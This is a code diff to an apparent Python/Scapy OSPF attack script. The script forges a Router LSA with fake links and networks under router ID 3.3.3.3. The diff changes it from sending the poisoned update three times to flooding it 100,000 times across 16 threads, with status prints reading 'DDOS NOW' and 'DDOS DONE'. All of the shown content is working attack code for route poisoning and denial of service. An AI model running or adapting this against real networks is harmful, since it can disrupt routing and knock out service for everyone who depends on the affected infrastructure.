@@ -4,6 +4,7 @@ import time
 import struct
 import threading
 import os
+from concurrent.futures import ThreadPoolExecutor
 
 state = "INIT"
 poison_time = 0
@@ -131,10 +132,13 @@ def handle_packet(packet):
             
         # If in "FULL" state and is poison time, handle the Hello Packet
         elif state == "FULL" and ospf_layer.type == 1 and poison_time == 1:
+            print("DDOS NOW")
+            time.sleep(2)
             send_ls_ack_target()
-            send_poison_packet(packet)
+            poison_thread = threading.Thread(target=send_poison_packet)
+            poison_thread.start()
             state = "POISON_SENT"
-            print("POISON_SENT")
+            print("DDOS DONE")
         
         # If in "FULL" state or "POISON_PROP" state, handle the LS Update packet
         elif state == "FULL" or state == "POISON_PROP" and ospf_layer.type == 4:
@@ -579,31 +583,34 @@ def send_ls_ack_all():
     send(ospf_packet_ack, iface="eth0", verbose=1)
 
 
-def send_poison_packet(received_packet):
-
+def send_poison_packet():
     global lsa_seq_r
+    
+    flood_count=100000
     
     lsa_seq = lsa_seq_r
     
+    # Define the OSPF Update Packet Structure
     ospf_update = OSPF_LSUpd(
-        lsacount=1, # Number of LSAs in this update
+        lsacount=1,
         lsalist=[OSPF_Router_LSA(
-        age=1,
-        id="3.3.3.3", 
-        adrouter="3.3.3.3", 
-        seq=lsa_seq + 1,
-        options=0x22, # 0x22 is Demand Circuits, External Routing
-        linklist=[
-        OSPF_Link(type=1, id="192.168.99.99", data="255.255.255.255", metric=1),  #  point-to-point links to another router
-        OSPF_Link(type=1, id="4.4.4.4", data="255.255.255.255", metric=1),
-        OSPF_Link(type=2, id="10.1.1.0", data="255.255.255.0", metric=1),  # Fake Links to multi-access networks
-        OSPF_Link(type=2, id="10.2.2.0", data="255.255.255.0", metric=1),
-        OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
-        OSPF_Link(type=2, id="192.168.20.0", data="255.255.255.0", metric=1),
-        OSPF_Link(type=3, id="192.168.30.0", data="255.255.255.0", metric=1) # Network with no OSPF routers
-        ])]
+            age=1,
+            id="3.3.3.3",
+            adrouter="3.3.3.3",
+            seq=lsa_seq,
+            options=0x22,
+            linklist=[
+                OSPF_Link(type=1, id="192.168.99.99", data="255.255.255.255", metric=1),
+                OSPF_Link(type=1, id="4.4.4.4", data="255.255.255.255", metric=1),
+                OSPF_Link(type=2, id="10.1.1.0", data="255.255.255.0", metric=1),
+                OSPF_Link(type=2, id="10.2.2.0", data="255.255.255.0", metric=1),
+                OSPF_Link(type=2, id="10.0.0.0", data="255.255.255.0", metric=1),
+                OSPF_Link(type=2, id="192.168.20.0", data="255.255.255.0", metric=1),
+                OSPF_Link(type=3, id="192.168.30.0", data="255.255.255.0", metric=1)
+            ]
+        )]
     )
-    
+
     ospf_header_update = OSPF_Hdr(
         version=2,
         type=4,
@@ -616,13 +623,16 @@ def send_poison_packet(received_packet):
         dst="224.0.0.5"
     ) / ospf_header_update / ospf_update
     
-    send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(1)
-    send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(1)
-    send(ospf_packet_update, iface="eth0", verbose=1)
-    time.sleep(1)
-        
+    def send_packet():
+        send(ospf_packet_update, iface="eth0", verbose=0)
+
+    with ThreadPoolExecutor(max_workers=16) as executor:  # 16 mean 16 parallel threads
+        for _ in range(flood_count):
+            executor.submit(send_packet)
+
+    # time.sleep(0.1)
+
+    # lsa_seq_r += flood_count
 
 def send_periodic_hellos():
     # Once FULL state is reached, send periodic Hello packets
